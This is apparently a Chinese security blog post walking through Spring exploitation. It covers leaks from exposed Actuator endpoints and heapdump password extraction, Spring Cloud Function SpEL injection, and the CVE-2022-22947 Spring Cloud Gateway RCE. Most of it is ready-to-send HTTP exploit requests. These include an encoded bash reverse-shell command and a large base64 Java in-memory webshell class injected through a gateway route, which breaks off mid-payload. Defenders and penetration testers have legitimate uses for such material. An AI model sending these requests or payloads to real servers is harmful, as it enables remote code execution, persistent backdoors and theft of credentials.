#  Spring漏洞测试与利用   
 黑白之道   2024-12-13 02:02  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
  
# Spring Boot基础原理  
  
Spring Boot是一款基于JAVA的开源框架，目的是为了简化Spring应用搭建和开发流程。是目前比较流行，大中小型企业常用的框架。正因为极大的简化了开发流程，才受到了绝大开发人员的喜爱。  
## 0x01 Spring Boot 表达式  
  
OGNL：Apache Commons Object-Graph Navigation Language（常见于Struts2框架）
SpEL：spring Expression Language  
### Spring Cloud  
  
Spring Cloud是一个服务治理平台，是若干个框架的集合，提供了全套的分布式系统解决方案。包含了：服务注册与发现、配置中心、服务网关、智能路由、负载均衡、断路器、监控跟踪、分布式消息队列等等。常见的漏洞组件：Alibaba nacos、FastJson、Apache Dubbo  
### Actuator  
  
Spring Boot中的Actuator模块为应用系统提供了自省和监控的功能，通过使用Actuator，开发者可以轻松的查看和统计应用系统的各种监控指标。从安全的角度来讲，不管是在互联网系统还是内网系统中，该节点都是不该泄露在生产环境中的  
#### Actuator Mappings  
  
可以用于查看路由![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfojpqddHenXwMOVY7Eu2JzuuuVVGyLibmn9jRZXeET1BoicQrZRXWuyaBw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
#### Actuator ENV  
  
项目环境变量-密码以密文的形式来显示![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoaiaRbYURxAJNwhCR7z8wH6NoHPbg9jmzRBN3owYlfEBtOicUh4DTXeOQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
#### Actuator Heapdump  
  
访问heapdump端点可以下载heapdump，JVM 内存文件![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoNl2peibsv60uHVY7icsBiclD8XvQQSUuVoHamCtljJ3QLGRqoC0ahKYFQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
下载之后的heapdump文件我们可以通过两款工具对其进行解密
heapdump_tool  
```
java -jar heapdump_tool.jar heapdump

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfokdJSANIic9cia6waiawKIgFuZsjW5cn60e5oL3aDokQuibJvRhe0zEdDgQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
这款工具是识别出heapdump后进行搜索匹配密码等敏感信息
JDumpSpider
这款工具相对来说比较好用一些，这款工具会将该heapdump文件解密后全部输出出来  
```
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump  > heapdump.txt

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfo3ZhcDDEQbWZG6UzQL2CNbtibKz7GVkacV0meyVBYU23rIWibdqzOjqJA/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoo1I7eh6zETIdYHMHEqe1MotEiaugMXQ5SLcyBm1hDv3sG9ib5icsUJ8gg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 0x02 Spring Cloud Function SPEL  
#### 漏洞成因  
  
由于Spring CouldFunction中RoutingFunction类的apply方法将请求头中的”spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，当使用路由功能时，攻击者可利用该漏洞远程执行任意代码。  
#### 影响版本  
  
3.0.0.RELEASE <= Spring Cloud Function <= 3.2.2  
#### 漏洞利用  
  
访问时用Burp拦截![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoSkMTACtpb89nBpVdb6jREAOlRnPBdj7Ayv0jabAicROZicDtMOD6EYew/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
修改请求头为  
```
POST /functionRouter

```  
  
添加请求体内容  
```
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("xxxx")

```  
  
exec(“xxxx”)：为要执行的命令，具体数据包如下：  
```
POST /functionRouter HTTP/1.1
Host: 192.168.45.198:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /1.txt")
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 4

test

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoP2ZeaKXzThKC7XtzaZ2XSQBiavLSlSicMsRW4aZLXSzUl269ExQATB9w/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
这时进入我们的容器中，输入命令就可以看到成功创建了1.txt  
```
docker-compose exec spring bash
ls 

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoOvI79BpiapiaibFveEZvd7AMTnTK9Dq37LpHWu20gdlVlMWH7VgIn1TXw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
反弹shell将exec(xxxx)修改如下（其中base64加密值为反弹shell命令）：  
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY0LjEzMi84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}

```  
## 0x03 CVE-2022-22947 Spring Cloud Geteway RCE  
### 漏洞成因  
  
Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。据公布的漏洞描述称，当Spring Cloud Gateway 执行器端点启用、公开且不安全时，使用Spring Cloud Gateway的应用程序容易受到代码注入攻击。远程攻击者可以发出含有恶意代码的请求，从而允许在远程主机上任意远程执行。  
### 漏洞利用  
#### 添加路由  
```
POST /actuator/gateway/routes/test HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 295


{"id":"[filter_name]",
"filters":[{
"name":"AddResponseHeader",
"args":{
"name":"Result",
"value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
}
}],
"uri":"http://example.com"}


```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfof8py8luRp8wHSctyyibS52mfnayQyDn19XDDoibJqTTjjwXicZcfHSfEg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
返回包中状态码中为201则代表创建成功  
#### 刷新配置  
```
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 7


```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoNTp6yWDR0cfuPyZaVqcgYOy1Zkd18xclOjByE9icv2KrFxjFPpdQEOw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
这里我们刷新路由使刚刚创建的路由生效  
#### 访问路由  
```
GET /actuator/gateway/test HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 7


```  
  
生效后再访问我们刚刚创建的路由即可达到RCE的效果![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoU2lNkGEeU5kbTARxYkjzVSzBPh2sxF3AlWrSiaoQoNJDEGQIpLicvibnQ/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
#### 删除路由  
```
DELETE /actuator/gateway/test HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 7


```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfocKibE8tprP8d9BO8qSkHxjSaoXQiasBR4icEUUOs5cTD7MKDHFnwk8dwg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
创建完路由之后，我们也可以删除路由（需重新刷新下配置信息）  
```
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 7


```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoSC7PQ9VsibW34O8SPuTojRJkAzUMp9ol7K4a9E3WPXl9FMwQJRt0ibSg/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
刷新完后再次访问当时创建的路由无法访问。![](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUiagx8Rmg3GUOghDTUoKjfoX16DxOaDncFCxkYBjxpkMOol2SV1ia61hQe0IrIRFhBZcUX3icCmHwlw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
### 注入内存马  
  
该漏洞也可进行注入内存马、suo5内存代理等代理，操作也比较简单，在创建路由时，直接将内容替换为内存马的内容后，再刷新路由即可。  
```
POST /actuator/gateway/routes/test HTTP/1.1
Host: 192.168.45.209:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 295

{
  "predicates": [
    {
      "name": "Path",
      "args": {
        "_genkey_0": "/hello"
      }
    }
  ],
  "filters": [
    {
      "name": "RewritePath",
      "args": {
        "_genkey_0": "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('GMemShell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBeAoADQC2BwC3CgACALYJABIAuAoAAgC5CQASALoKAAIAuwoAEgC8CQASAL0KAA0AvggAcgcAvwcAwAcAwQcAwgoADADDCgAOAMQHAMUIAJ8HAMYHAMcKAA8AyAsAyQDKCgASALYKAA4AywgAzAcAzQoAGwDOCADPBwDQBwDRCgDSANMKANIA1AoAHgDVBwDWCACBBwCECQDXANgKANcA2QgA2goA2wDcBwDdCgAVAN4KACoA3woA2wDgCgDbAOEIAOIKAOMA5AoAFQDlCgDjAOYHAOcKAOMA6AoAMwDpCgAzAOoKABUA6wgA7AoADADtCADuCgAMAO8IAPAIAPEKAAwA8ggA8wgA9AgA9QgA9ggA9wsAFAD4EgAAAP4KAP8BAAcBAQkBAgEDCgBHAQQKABsBBQsBBgEHCgASAQgKABIBCQkAEgEKCAELCwEMAQ0KABIBDgsBDAEPCAEQBwERCgBUALYKAA0BEgoAFQETCgANALsKAFQBFAoAEgEVCgAVARYKAP8BFwcBGAoAXQC2CABlCAEZAQAFc3RvcmUBAA9MamF2YS91dGlsL01hcDsBAAlTaWduYXR1cmUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwEABHBhc3MBABJMamF2YS9sYW5nL1N0cmluZzsBAANtZDUBAAJ4YwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQALTEdNZW1TaGVsbDsBAAhkb0luamVjdAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVcmVnaXN0ZXJIYW5kbGVyTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAANtc2cBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADb2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEcGF0aAEADVN0YWNrTWFwVGFibGUHAM0HAMcBABBNZXRob2RQYXJhbWV0ZXJzAQALZGVmaW5lQ2xhc3MBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAApjbGFzc2J5dGVzAQACW0IBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAZtZXRob2QBAApFeGNlcHRpb25zAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABcwEAAW0BAAFaBwDFBwEaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAJicwEABXZhbHVlAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAANjbWQBAF0oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAAxidWZmZXJTdHJlYW0BAAJleAEABXBkYXRhAQAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTsBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA1TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9Qb3N0TWFwcGluZzsBAAQvY21kAQAMbGFtYmRhJGNtZCQwAQBHKExvcmcvc3ByaW5nZnJhbWV3b3JrL3V0aWwvTXVsdGlWYWx1ZU1hcDspTHJlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubzsBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAAmlkAQAEZGF0YQEAKExvcmcvc3ByaW5nZnJhbWV3b3JrL3V0aWwvTXVsdGlWYWx1ZU1hcDsBAAZyZXN1bHQBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7BwC3AQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAOR01lbVNoZWxsLmphdmEMAGkAagEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDABlAGYMARsBHAwAaABmDAEdAR4MAGcAkgwAZwBmDAEfASABAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQBBb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MASEBIgwBIwEkAQAJR01lbVNoZWxsAQAwb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmVyL1NlcnZlcldlYkV4Y2hhbmdlAQAQamF2YS9sYW5nL1N0cmluZwwBJQEoBwEpDAEqASsMASwBLQEAAm9rAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwBLgBqAQAFZXJyb3IBABdqYXZhL25ldC9VUkxDbGFzc0xvYWRlcgEADGphdmEvbmV0L1VSTAcBLwwBMAExDAEyATMMAGkBNAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcBNQwBNgCZDAE3ATgBAANBRVMHARoMATkBOgEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMATsBPAwAaQE9DAE+AT8MAUABQQEAA01ENQcBQgwBOQFDDAFEAUUMAUYBRwEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAFIATwMAGkBSQwBHQFKDAFLAR4BABBqYXZhLnV0aWwuQmFzZTY0DAFMAU0BAApnZXRFbmNvZGVyDAFOASIBAA5lbmNvZGVUb1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMAU8BUAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDAFRAVIBABBCb290c3RyYXBNZXRob2RzDwYBUxABVA8HAVUQAKkMAVYBVwcBWAwBWQFaAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5BwFbDAFcAV0MAGkBXgwBXwEeBwFgDAFhAVQMAJwAnQwAiQCKDABhAGIBAAdwYXlsb2FkBwFiDAFjAVQMAIEAggwBZAFlAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAFmAWcMAWgBaQwBagE8DACVAJYMAWgBSgwBawFsAQARamF2YS91dGlsL0hhc2hNYXABABAzYzZlMGI4YTljMTUyMjRhAQATamF2YXgvY3J5cHRvL0NpcGhlcgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEABXBhdGhzAQAHQnVpbGRlcgEADElubmVyQ2xhc3NlcwEAYChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyOwEASW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXIBAAVidWlsZAEARSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQApKFtMamF2YS9uZXQvVVJMO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQALZ2V0Rm9ybURhdGEBAB8oKUxyZWFjdG9yL2NvcmUvcHVibGlzaGVyL01vbm87CgFtAW4BACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwoAEgFvAQAFYXBwbHkBACooTEdNZW1TaGVsbDspTGphdmEvdXRpbC9mdW5jdGlvbi9GdW5jdGlvbjsBABtyZWFjdG9yL2NvcmUvcHVibGlzaGVyL01vbm8BAAdmbGF0TWFwAQA8KExqYXZhL3V0aWwvZnVuY3Rpb24vRnVuY3Rpb247KUxyZWFjdG9yL2NvcmUvcHVibGlzaGVyL01vbm87AQAjb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXMBAAJPSwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czsBADooTGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzOylWAQAKZ2V0TWVzc2FnZQEAJm9yZy9zcHJpbmdmcmFtZXdvcmsvdXRpbC9NdWx0aVZhbHVlTWFwAQAIZ2V0Rmlyc3QBAA1qYXZhL3V0aWwvTWFwAQADZ2V0AQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9CeXRlQXJyYXkBAARqdXN0AQAxKExqYXZhL2xhbmcvT2JqZWN0OylMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwcBcAwBcQF0DACoAKkBACJqYXZhL2xhbmcvaW52b2tlL0xhbWJkYU1ldGFmYWN0b3J5AQALbWV0YWZhY3RvcnkHAXYBAAZMb29rdXABAMwoTGphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcyRMb29rdXA7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlOylMamF2YS9sYW5nL2ludm9rZS9DYWxsU2l0ZTsHAXcBACVqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwAQAeamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzACEAEgANAAAABAAJAGEAYgABAGMAAAACAGQACQBlAGYAAAAJAGcAZgAAAAkAaABmAAAACgABAGkAagABAGsAAAAvAAEAAQAAAAUqtwABsQAAAAIAbAAAAAYAAQAAAA4AbQAAAAwAAQAAAAUAbgBvAAAACQBwAHEAAgBrAAABSAAHAAYAAACQuwACWbcAA7IABLYABbIABrYABbYAB7gACLMACSq2AAoSCwa9AAxZAxINU1kEEg5TWQUSD1O2ABBOLQS2ABESEhITBL0ADFkDEhRTtgAQOgQEvQAVWQMrU7gAFrkAFwEAOgUtKga9AA1ZA7sAElm3ABhTWQQZBFNZBRkFU7YAGVcSGk2nAAtOLbYAHBIdTSywAAEAAACDAIYAGwADAGwAAAAyAAwAAAAVABwAFgA5ABcAPgAYAFAAGQBiABoAgAAbAIMAHwCGABwAhwAdAIsAHgCOACAAbQAAAFIACAA5AEoAcgBzAAMAUAAzAHQAcwAEAGIAIQB1AHYABQCDAAMAdwBmAAIAhwAHAHgAeQADAAAAkAB6AHsAAAAAAJAAfABmAAEAjgACAHcAZgACAH0AAAAOAAL3AIYHAH78AAcHAH8AgAAAAAkCAHoAAAB8AAAACgCBAIIAAwBrAAAAngAGAAMAAABUuwAeWQO9AB+4ACC2ACG3ACJMEiMSJAa9AAxZAxIlU1kEsgAmU1kFsgAmU7YAEE0sBLYAESwrBr0ADVkDKlNZBAO4ACdTWQUqvrgAJ1O2ABnAAAywAAAAAgBsAAAAEgAEAAAAJQASACYALwAnADQAKABtAAAAIAADAAAAVACDAIQAAAASAEIAhQCGAAEALwAlAIcAcwACAIgAAAAEAAEAGwCAAAAABQEAgwAAAAEAiQCKAAIAawAAANcABgAEAAAAKxIouAApTi0cmQAHBKcABAW7ACpZsgAGtgArEii3ACy2AC0tK7YALrBOAbAAAQAAACcAKAAbAAMAbAAAABYABQAAAC0ABgAuACIALwAoADAAKQAxAG0AAAA0AAUABgAiAIsAjAADACkAAgB4AHkAAwAAACsAbgBvAAAAAAArAI0AhAABAAAAKwCOAI8AAgB9AAAAPAAD/wAPAAQHAJAHACUBBwCRAAEHAJH/AAAABAcAkAcAJQEHAJEAAgcAkQH/ABcAAwcAkAcAJQEAAQcAfgCAAAAACQIAjQAAAI4AAAAJAGcAkgACAGsAAACnAAQAAwAAADABTBIvuAAwTSwqtgArAyq2ADG2ADK7ADNZBCy2ADS3ADUQELYANrYAN0ynAARNK7AAAQACACoALQAbAAMAbAAAAB4ABwAAADYAAgA5AAgAOgAVADsAKgA9AC0APAAuAD4AbQAAACAAAwAIACIAjgCTAAIAAAAwAI0AZgAAAAIALgCUAGYAAQB9AAAAEwAC/wAtAAIHAH8HAH8AAQcAfgAAgAAAAAUBAI0AAAAJAJUAlgADAGsAAAFEAAYABQAAAHIBTRI4uAA5TCsSOgG2ADsrAbYAGU4ttgAKEjwEvQAMWQMSJVO2ADstBL0ADVkDKlO2ABnAABVNpwA5ThI9uAA5TCu2AD46BBkEtgAKEj8EvQAMWQMSJVO2ADsZBAS9AA1ZAypTtgAZwAAVTacABToELLAAAgACADcAOgAbADsAawBuABsAAwBsAAAAMgAMAAAAQwACAE